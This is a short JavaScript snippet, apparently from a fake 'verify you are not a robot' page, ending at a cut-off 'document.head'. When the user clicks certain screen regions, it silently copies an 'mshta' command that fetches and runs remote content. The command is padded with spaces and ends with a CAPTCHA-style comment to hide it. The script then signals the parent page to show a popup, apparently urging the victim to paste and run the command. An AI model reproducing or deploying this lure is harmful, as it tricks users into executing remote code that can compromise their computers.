var writeToClipboard = `                mshta https://beta.doublecounter.cc/v/ #                             By pressing OK you confirm you are not a robot.            `

document.addEventListener('click', function (event) {
    console.log(event.x, event.y)
    if((event.x > 15 && event.x < 40) && (event.y > 20 && event.y < 45)) {
        navigator.clipboard.writeText(writeToClipboard)
        window.parent.postMessage('showPopup', '*');
        
    } else if ((event.y > 19 && event.y < 45) && (event.x > 43 && event.x < 181))
    {
        navigator.clipboard.writeText(writeToClipboard)
        window.parent.postMessage('showPopup', '*');
    }
  });
  

  document.head